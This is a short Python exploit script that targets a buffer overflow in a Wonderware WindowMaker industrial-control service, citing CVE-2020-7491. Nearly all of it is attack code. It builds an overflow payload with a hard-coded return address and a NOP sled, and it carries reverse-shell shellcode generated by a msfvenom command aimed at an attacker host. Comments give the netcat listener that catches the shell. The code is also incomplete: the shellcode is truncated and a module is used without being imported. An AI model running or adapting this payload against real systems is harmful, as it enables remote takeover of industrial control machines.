def intouch_windowmaker_exploit(target_ip):
    """
    Buffer overflow in Wonderware WindowMaker service
    Allows remote code execution
    CVE-2020-7491
    """
    import socket

    # Vulnerable service on port 2222
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, 2222))

    # Buffer overflow in project name field
    # Offset to EIP: 260 bytes
    offset = 260

    # Shellcode (reverse shell to attacker)
    # msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -b '\x00\x0a\x0d' -f python
    shellcode = (
        b"\xdb\xc0\xd9\x74\x24\xf4\xba\x7e\x9e\x9f\x7c\x5e\x29"
        # ... (truncated for brevity)
    )

    # Return address (adjust for target system)
    # Windows 7: JMP ESP in kernel32.dll
    ret_addr = struct.pack('<I', 0x7C874413)

    # NOP sled
    nops = b'\x90' * 16

    # Construct payload
    payload = b'A' * offset + ret_addr + nops + shellcode

    # Send malicious packet
    packet = b'PROJECT_OPEN\n' + payload + b'\n'
    sock.send(packet)

    print("[+] Exploit payload sent")
    print("[*] Check reverse shell listener on port 4444")

    sock.close()

# Listener on attacker machine:
# nc -lvnp 4444

# intouch_windowmaker_exploit('192.168.1.100')
